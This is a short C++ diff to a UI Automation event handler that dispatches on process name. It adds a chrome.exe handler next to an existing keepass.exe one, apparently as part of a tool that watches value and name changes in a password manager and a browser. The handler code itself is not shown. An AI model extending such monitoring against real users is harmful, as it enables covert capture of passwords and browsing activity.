@@ -118,6 +118,7 @@ HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEv
 	else {
 		std::unordered_map<std::wstring, std::function<void()>> handlers = {
 			{ L"keepass.exe", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleKeepass(pAutomationElement, wsProcName, wsDate, propId, vVar); } },
+			{ L"chrome.exe", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleChrome(pAutomationElement, wsProcName, wsDate, propId, vVar); } },
 		};
 
 		auto it = handlers.find(Helpers::ConvertToLower(wsProcName));
@@ -163,7 +164,7 @@ HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::Deploy(IUIAutomation* p
 	std::vector<int> propertyIds = {
 		UIA_NamePropertyId,
 		UIA_ValueValuePropertyId,
-		UIA_SelectionItemIsSelectedPropertyId
+		UIA_SelectionItemIsSelectedPropertyId,
 	};
 
 
